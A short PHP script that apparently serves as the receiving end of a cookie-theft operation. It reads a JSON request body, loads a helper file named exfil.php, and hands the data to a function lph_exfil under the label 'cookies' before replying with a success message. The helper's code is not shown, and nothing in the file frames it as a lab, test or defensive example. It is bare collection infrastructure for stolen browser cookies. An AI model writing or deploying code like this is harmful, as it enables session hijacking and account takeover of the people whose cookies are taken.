<?php
$d=json_decode(file_get_contents('php://input'),true)?:[];
require_once __DIR__.'/exfil.php';
lph_exfil('cookies',$d);
echo '{"ok":true}';
